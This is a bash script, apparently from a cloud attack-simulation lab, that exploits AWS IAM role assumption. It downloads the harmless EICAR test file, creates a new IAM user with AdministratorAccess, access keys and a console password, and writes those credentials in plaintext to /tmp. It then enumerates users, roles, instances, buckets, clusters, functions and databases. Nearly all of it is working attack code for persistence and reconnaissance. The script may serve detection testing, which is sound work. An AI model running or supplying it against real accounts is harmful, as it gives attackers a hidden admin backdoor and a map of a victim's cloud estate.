#!/bin/bash

# Script to exploit IAM role assumption and create additional user for cloud reconnaissance
# Downloads EICAR test file as part of attack simulation

set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          IAM Role Exploitation & Cloud Reconnaissance       ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Get exploitation role ARN from Terraform output or environment
if [ -z "${EXPLOITATION_ROLE_ARN:-}" ]; then
    if [ -f "$SCRIPT_DIR/../../terraform/terraform.tfstate" ]; then
        EXPLOITATION_ROLE_ARN=$(cd "$SCRIPT_DIR/../../terraform" && terraform output -raw exploitation_role_arn 2>/dev/null || echo "")
    fi
    
    if [ -z "$EXPLOITATION_ROLE_ARN" ]; then
        # Try to get from AWS directly
        AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "")
        AWS_REGION=$(aws configure get region || echo "us-east-1")
        if [ -n "$AWS_ACCOUNT_ID" ]; then
            EXPLOITATION_ROLE_ARN="arn:aws:iam::${AWS_ACCOUNT_ID}:role/exploitation-admin-role"
        else
            echo -e "${RED}Error: Cannot determine exploitation role ARN${NC}"
            echo -e "${YELLOW}Set EXPLOITATION_ROLE_ARN environment variable or run from terraform directory${NC}"
            exit 1
        fi
    fi
fi

echo -e "${YELLOW}Exploitation Role ARN: $EXPLOITATION_ROLE_ARN${NC}\n"

# Step 1: Assume the exploitation role
echo -e "${BLUE}[Step 1] Assuming exploitation role...${NC}"
CREDENTIALS=$(aws sts assume-role \
    --role-arn "$EXPLOITATION_ROLE_ARN" \
    --role-session-name "exploitation-session-$(date +%s)" \
    --duration-seconds 3600 \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to assume role${NC}"
    echo -e "${YELLOW}Make sure you're running from the bastion with correct IAM permissions${NC}"
    exit 1
fi

export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Role assumed successfully${NC}"
echo -e "${YELLOW}  Access Key ID: ${AWS_ACCESS_KEY_ID:0:20}...${NC}\n"

# Step 2: Verify elevated permissions
echo -e "${BLUE}[Step 2] Verifying elevated permissions...${NC}"
CALLER_IDENTITY=$(aws sts get-caller-identity --output json)
ACCOUNT_ID=$(echo "$CALLER_IDENTITY" | jq -r '.Account')
ROLE_NAME=$(echo "$CALLER_IDENTITY" | jq -r '.Arn' | awk -F'/' '{print $2}')
echo -e "${GREEN}✓ Current identity:${NC}"
echo -e "  Account ID: $ACCOUNT_ID"
echo -e "  Role: $ROLE_NAME"
echo ""

# Step 3: Download EICAR test file (malware simulation)
echo -e "${BLUE}[Step 3] Downloading EICAR test file (malware simulation)...${NC}"
EICAR_URL="https://www.eicar.org/download/eicar.com"
EICAR_FILE="/tmp/eicar.com"

if curl -s -o "$EICAR_FILE" "$EICAR_URL" 2>/dev/null; then
    EICAR_HASH=$(md5sum "$EICAR_FILE" 2>/dev/null | awk '{print $1}' || sha256sum "$EICAR_FILE" 2>/dev/null | awk '{print $1}' || echo "unknown")
    echo -e "${GREEN}✓ EICAR file downloaded${NC}"
    echo -e "${YELLOW}  File: $EICAR_FILE${NC}"
    echo -e "${YELLOW}  Hash: $EICAR_HASH${NC}"
    echo -e "${YELLOW}  Size: $(wc -c < "$EICAR_FILE") bytes${NC}"
    
    # Also download the zip version
    curl -s -o "/tmp/eicar_com.zip" "https://www.eicar.org/download/eicar_com.zip" 2>/dev/null && \
        echo -e "${GREEN}✓ EICAR ZIP file downloaded${NC}" || true
else
    echo -e "${YELLOW}⚠ Could not download EICAR (may be blocked)${NC}"
    # Create a simple test file instead
    echo "X5O!P%@AP[4\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*" > "$EICAR_FILE"
    echo -e "${GREEN}✓ Created local EICAR test file${NC}"
fi
echo ""

# Step 4: Create additional IAM user for reconnaissance
echo -e "${BLUE}[Step 4] Creating additional IAM user for cloud reconnaissance...${NC}"
RECON_USERNAME="recon-user-$(date +%s | tail -c 6)"
RECON_PASSWORD=$(openssl rand -base64 32 2>/dev/null || date +%s | sha256sum | head -c 32)

# Create user
if aws iam create-user --user-name "$RECON_USERNAME" --output json > /tmp/user_creation.json 2>/dev/null; then
    echo -e "${GREEN}✓ User created: $RECON_USERNAME${NC}"
    
    # Attach AdministratorAccess policy
    if aws iam attach-user-policy \
        --user-name "$RECON_USERNAME" \
        --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>/dev/null; then
        echo -e "${GREEN}✓ AdministratorAccess policy attached${NC}"
    fi
    
    # Create access keys
    ACCESS_KEYS=$(aws iam create-access-key --user-name "$RECON_USERNAME" --output json 2>/dev/null)
    if [ $? -eq 0 ]; then
        ACCESS_KEY_ID=$(echo "$ACCESS_KEYS" | jq -r '.AccessKey.AccessKeyId')
        SECRET_ACCESS_KEY=$(echo "$ACCESS_KEYS" | jq -r '.AccessKey.SecretAccessKey')
        echo -e "${GREEN}✓ Access keys created${NC}"
        echo -e "${YELLOW}  Access Key ID: $ACCESS_KEY_ID${NC}"
        echo -e "${YELLOW}  Secret Access Key: ${SECRET_ACCESS_KEY:0:20}...${NC}"
        
        # Save credentials to file
        cat > /tmp/recon_credentials.txt <<EOF
# Cloud Reconnaissance User Credentials
Username: $RECON_USERNAME
Access Key ID: $ACCESS_KEY_ID
Secret Access Key: $SECRET_ACCESS_KEY
Role ARN: $EXPLOITATION_ROLE_ARN
Account ID: $ACCOUNT_ID
Created: $(date)
EOF
        echo -e "${GREEN}✓ Credentials saved to /tmp/recon_credentials.txt${NC}"
    fi
    
    # Create login profile (console access)
    if aws iam create-login-profile \
        --user-name "$RECON_USERNAME" \
        --password "$RECON_PASSWORD" \
        --password-reset-required 2>/dev/null; then
        echo -e "${GREEN}✓ Console login profile created${NC}"
        echo -e "${YELLOW}  Password: $RECON_PASSWORD${NC}"
        echo "$RECON_PASSWORD" >> /tmp/recon_credentials.txt
    fi
else
    echo -e "${YELLOW}⚠ User may already exist or creation failed${NC}"
fi
echo ""

# Step 5: Cloud reconnaissance
echo -e "${BLUE}[Step 5] Performing cloud reconnaissance...${NC}"

# List all IAM users
echo -e "${YELLOW}  Listing IAM users...${NC}"
aws iam list-users --output json > /tmp/iam_users.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.Users | length' /tmp/iam_users.json) users${NC}" || true

# List all IAM roles
echo -e "${YELLOW}  Listing IAM roles...${NC}"
aws iam list-roles --output json > /tmp/iam_roles.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.Roles | length' /tmp/iam_roles.json) roles${NC}" || true

# List EC2 instances
echo -e "${YELLOW}  Listing EC2 instances...${NC}"
aws ec2 describe-instances --output json > /tmp/ec2_instances.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.Reservations[].Instances[] | select(.State.Name=="running") | .InstanceId' /tmp/ec2_instances.json | wc -l) running instances${NC}" || true

# List S3 buckets
echo -e "${YELLOW}  Listing S3 buckets...${NC}"
aws s3 ls > /tmp/s3_buckets.txt 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(wc -l < /tmp/s3_buckets.txt) buckets${NC}" || true

# List EKS clusters
echo -e "${YELLOW}  Listing EKS clusters...${NC}"
aws eks list-clusters --output json > /tmp/eks_clusters.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.clusters | length' /tmp/eks_clusters.json) clusters${NC}" || true

# List Lambda functions
echo -e "${YELLOW}  Listing Lambda functions...${NC}"
aws lambda list-functions --output json > /tmp/lambda_functions.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.Functions | length' /tmp/lambda_functions.json) functions${NC}" || true

# List RDS instances
echo -e "${YELLOW}  Listing RDS instances...${NC}"
aws rds describe-db-instances --output json > /tmp/rds_instances.json 2>/dev/null && \
    echo -e "${GREEN}    ✓ Found $(jq -r '.DBInstances | length' /tmp/rds_instances.json) instances${NC}" || true

echo -e "${GREEN}✓ Cloud reconnaissance completed${NC}"
echo -e "${YELLOW}  Reconnaissance data saved to /tmp/${NC}"
echo ""

# Step 6: Summary
echo -e "${BLUE}[Summary]${NC}"
echo -e "${GREEN}✓ Role assumed: $EXPLOITATION_ROLE_ARN${NC}"
echo -e "${GREEN}✓ EICAR file downloaded: $EICAR_FILE${NC}"
echo -e "${GREEN}✓ Reconnaissance user created: $RECON_USERNAME${NC}"
echo -e "${GREEN}✓ Cloud reconnaissance completed${NC}"
echo ""
echo -e "${YELLOW}Credentials and reconnaissance data saved to /tmp/${NC}"
echo -e "${YELLOW}Use the recon user credentials for further cloud exploration${NC}"

